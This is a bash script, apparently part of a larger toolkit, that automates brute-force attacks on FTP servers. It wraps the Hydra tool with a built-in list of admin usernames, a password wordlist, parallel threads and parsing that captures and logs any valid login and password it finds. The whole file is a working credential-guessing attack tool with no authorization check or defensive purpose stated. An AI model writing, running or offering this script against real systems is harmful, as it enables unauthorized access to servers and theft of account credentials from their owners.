#!/bin/bash

# FTP Admin Attack Script
# Automated FTP brute-force targeting admin accounts

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source logger
source "$SCRIPT_DIR/logger.sh"

# Default configuration
THREADS=16
TIMEOUT=30
TARGET=""
PORT=21

# Common FTP admin usernames
DEFAULT_USERNAMES=(ftp ftpuser ftpadmin admin administrator anonymous)

# Function to display help
show_help() {
    print_banner "FTP Admin Attack Script"
    echo ""
    echo "Usage: $0 -t TARGET [OPTIONS]"
    echo ""
    echo "Required:"
    echo "  -t, --target      Target IP address or hostname"
    echo ""
    echo "Optional:"
    echo "  -p, --port        FTP port (default: 21)"
    echo "  -u, --user-list   Custom username list file"
    echo "  -w, --word-list   Custom password wordlist file"
    echo "  -T, --threads     Number of parallel threads (default: 16)"
    echo "  -o, --timeout     Connection timeout in seconds (default: 30)"
    echo "  -v, --verbose     Verbose output"
    echo "  -h, --help        Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 -t 192.168.1.100"
    echo "  $0 -t ftp.example.com -p 2121"
    echo ""
}

# Function to validate input
validate_input() {
    if [ -z "$TARGET" ]; then
        log_error "Target is required"
        show_help
        exit 1
    fi
    
    if ! command -v hydra &> /dev/null; then
        log_error "Hydra is not installed. Please run install.sh first"
        exit 1
    fi
}

# Function to run FTP attack
run_attack() {
    local username_file=$(mktemp)
    
    # Get usernames
    if [ -n "$CUSTOM_USERLIST" ] && [ -f "$CUSTOM_USERLIST" ]; then
        cat "$CUSTOM_USERLIST" > "$username_file"
    elif [ -f "$PROJECT_ROOT/config/admin_usernames.txt" ]; then
        cat "$PROJECT_ROOT/config/admin_usernames.txt" > "$username_file"
    else
        printf "%s\n" "${DEFAULT_USERNAMES[@]}" > "$username_file"
    fi
    
    # Get password wordlist
    local wordlist=""
    if [ -n "$CUSTOM_WORDLIST" ] && [ -f "$CUSTOM_WORDLIST" ]; then
        wordlist="$CUSTOM_WORDLIST"
    elif [ -f "$PROJECT_ROOT/config/admin_passwords.txt" ]; then
        wordlist="$PROJECT_ROOT/config/admin_passwords.txt"
    else
        log_error "No password wordlist found"
        rm -f "$username_file"
        exit 1
    fi
    
    print_header "Starting FTP Attack"
    log_info "Target: $TARGET:$PORT"
    log_info "Threads: $THREADS"
    log_info "Timeout: ${TIMEOUT}s"
    echo ""
    
    # Run hydra
    local output_file=$(mktemp)
    hydra -L "$username_file" -P "$wordlist" \
          -t $THREADS \
          -w $TIMEOUT \
          -o "$output_file" \
          -f \
          ftp://$TARGET:$PORT 2>&1 | while IFS= read -r line; do
        
        if [[ $line == *"host:"* ]] && [[ $line == *"login:"* ]] && [[ $line == *"password:"* ]]; then
            local login=$(echo "$line" | grep -oP 'login: \K[^ ]+')
            local password=$(echo "$line" | grep -oP 'password: \K[^ ]+')
            
            save_result "ftp" "$TARGET" "$login" "$password" "$PORT"
            log_success "Valid credentials found: $login:$password"
            
            rm -f "$username_file" "$output_file"
            return 0
        fi
        
        [ "$VERBOSE" = "true" ] && echo "$line"
    done
    
    local result=$?
    rm -f "$username_file" "$output_file"
    
    if [ $result -eq 0 ]; then
        log_success "Attack successful!"
    else
        log_warning "No valid credentials found"
    fi
    
    return $result
}

# Parse command line arguments
CUSTOM_WORDLIST=""
CUSTOM_USERLIST=""
VERBOSE=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET="$2"
            shift 2
            ;;
        -p|--port)
            PORT="$2"
            shift 2
            ;;
        -u|--user-list)
            CUSTOM_USERLIST="$2"
            shift 2
            ;;
        -w|--word-list)
            CUSTOM_WORDLIST="$2"
            shift 2
            ;;
        -T|--threads)
            THREADS="$2"
            shift 2
            ;;
        -o|--timeout)
            TIMEOUT="$2"
            shift 2
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Main execution
print_banner "FTP Admin Attack"
echo ""

validate_input
run_attack
exit_code=$?

rotate_logs
exit $exit_code
